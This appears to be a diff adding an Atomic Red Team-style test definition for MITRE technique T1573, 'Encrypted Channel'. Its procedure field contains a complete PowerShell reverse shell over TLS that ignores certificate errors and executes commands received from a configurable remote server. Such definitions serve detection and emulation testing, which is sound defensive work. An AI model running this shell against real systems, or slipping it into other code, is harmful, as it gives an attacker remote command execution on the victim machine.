@@ -1,0 +1,33 @@
+{
+  "attack_technique": "T1573",
+  "display_name": "Encrypted Channel",
+  "atomic_tests": [
+    {
+      "name": "OpenSSL C2",
+      "description": "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "procedure": "$server_ip = #{server_ip}\n$server_port = #{server_port}\n$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fakedomain.example', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '> ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2>&1;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "server_ip",
+          "description": "IP of the external server",
+          "type": "string",
+          "default": "127.0.0.1"
+        },
+        {
+          "arg_name": "server_port",
+          "description": "The port to connect to on the external server",
+          "type": "string",
+          "default": "443"
+        }
+      ],
+      "auto_generated_guid": "21caf58e-87ad-440c-a6b8-3ac259964003"
+    }
+  ]
+}
